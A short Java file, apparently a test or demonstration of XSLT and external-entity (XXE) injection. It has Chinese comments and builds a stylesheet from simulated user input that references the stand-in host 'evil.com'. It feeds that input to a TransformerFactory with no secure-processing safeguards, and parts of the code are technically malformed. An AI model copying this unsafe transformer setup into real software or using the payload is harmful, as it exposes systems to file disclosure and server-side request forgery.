package com.test;

import javax.xml.transform.*;
import javax.xml.transform.stream.StreamResult;
import javax.xml.transform.stream.StreamSource;

public class Test {

    public static void main(String[] args) throws Exception {
        // 用户提供的输入，这里假设用户可以控制输入
        String userInput = "<xsl:stylesheet xmlns:xsl='http://www.w3.org/1999/XSL/Transform' version='1.0'>" +
                "<xsl:template match='/'>" +
                "<!ENTITY xxe SYSTEM 'http://evil.com/evil.xml'>" +
                "<xsl:copy-of select='document(\"&xxe;\")'/>" +
                "</xsl:template>" +
                "</xsl:stylesheet>";

        // 创建TransformerFactory和Transformer
        TransformerFactory factory = TransformerFactory.newInstance();
        Transformer transformer = factory.newTransformer(new StreamSource(userInput));

        // 输入XML数据（假设data.xml包含合法XML数据）
        Source xmlInput = new StreamSource("data.xml");

        // 执行XSLT转换
        transformer.transform(xmlInput, new StreamResult(System.out));
    }
}
